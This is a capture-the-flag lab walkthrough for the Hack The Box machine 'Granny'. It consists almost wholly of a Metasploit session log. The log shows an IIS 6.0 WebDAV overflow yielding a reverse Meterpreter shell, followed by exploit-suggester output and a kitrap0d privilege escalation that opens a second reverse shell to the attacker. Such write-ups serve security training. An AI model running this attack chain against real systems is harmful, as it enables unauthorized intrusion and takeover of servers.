# Granny

## where you at

10.10.10.15 

## what you got

IIS 6.0 + Webdav

```
msf5 > search ScStoragePathFromUrl                                                                       

Matching Modules                                    
================                  
                                                    
   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes     Microsoft IIS WebDav ScStoragePathFromUrl Overflow

                                                    
msf5 > use 0                      
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LHOST tun0
LHOST => tun0                                                                                           
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LPORT 4444
LPORT => 4444                                       
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOST 10.10.10.15
RHOST => 10.10.10.15                           
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options                            

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         10.10.10.15      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run                                                                                                                                            [8/97]
                                                                                                                                                                                                                 
[*] Started reverse TCP handler on 10.10.14.24:4445                                                                                                                                                              
[*] Trying path length 3 to 60 ...
[*] Sending stage (180291 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.14.24:4445 -> 10.10.10.15:1030) at 2020-01-25 15:24:42 +0100
                                                    
meterpreter > getuid              
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
meterpreter > sysinfo
Computer        : GRANNY
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > ps
Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                 
 4     0     System                                                           
 272   4     smss.exe                                                         
 324   272   csrss.exe                                                        
 348   272   winlogon.exe                                                     
 396   348   services.exe                                                     
 408   348   lsass.exe                                                        
 588   396   svchost.exe                                                      
 680   396   svchost.exe                                                      
 736   396   svchost.exe                                                      
 764   396   svchost.exe                                                      
 800   396   svchost.exe                                                      
 936   396   spoolsv.exe                                                      
 964   396   msdtc.exe                                                        
 1084  396   cisvc.exe                                                        
 1132  396   svchost.exe                                                      
 1180  396   inetinfo.exe                                                     
 1216  396   svchost.exe                                                      
 1332  396   VGAuthService.exe                                                
 1412  396   vmtoolsd.exe                                                     
 1460  396   svchost.exe                                                      
 1600  396   svchost.exe                                                      
 1704  396   alg.exe                                                          
 1828  588   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1908  396   dllhost.exe                                                      
 2380  588   wmiprvse.exe                                                     
 3040  588   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 3092  2060  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 3164  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe

meterpreter > getpid
Current pid: 3092
meterpreter > migrate 3164
[*] Migrating from 3092 to 3164...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > search suggest

Matching Modules
================

   #  Name                                             Disclosure Date  Rank    Check  Description
   -  ----                                             ---------------  ----    -----  -----------
   0  auxiliary/server/icmp_exfil                                       normal  No     ICMP Exfiltration Service
   1  exploit/windows/browser/ms10_018_ie_behaviors    2010-03-09       good    No     MS10-018 Microsoft Internet Explorer DHTML Behaviors Use After Free
   2  exploit/windows/smb/timbuktu_plughntcommand_bof  2009-06-25       great   No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow
   3  post/multi/recon/local_exploit_suggester                          normal  No     Multi Recon Local Exploit Suggester
   4  post/osx/gather/enum_colloquy                                     normal  No     OS X Gather Colloquy Enumeration
   5  post/osx/manage/sonic_pi                                          normal  No     OS X Manage Sonic Pi


msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use 3
msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 29 exploit checks are being tried...                                                                                                                                                           
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.                                                                                                   
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.                                                                                                          
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.                                                                                                               
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.                                                                                                         
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.                                                                                                     
[+] 10.10.10.15 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.                                                                             
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.                                                                                                                
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.                                                                                                          
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.                                                                                                                    
[*] Post module execution completed                                                                                                                                                                              
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d                                                                                                                     
msf5 exploit(windows/local/ms10_015_kitrap0d) > set session 1                                                                                                                                                    
session => 1

msf5 exploit(windows/local/ms10_015_kitrap0d) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/ms10_015_kitrap0d) > set lhost tun0
lhost => tun0
msf5 exploit(windows/local/ms10_015_kitrap0d) > set lport 4445
lport => 4445
msf5 exploit(windows/local/ms10_015_kitrap0d) > show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4445             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf5 exploit(windows/local/ms10_015_kitrap0d) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf5 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.24:4445 
[*] Launching notepad to host the exploit...
[+] Process 2416 launched.
[*] Reflectively injecting the exploit DLL into 2416...
[*] Injecting exploit into 2416 ...
[*] Exploit injected. Injecting payload into 2416...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (180291 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.14.24:4445 -> 10.10.10.15:1031) at 2020-01-25 15:29:11 +0100

```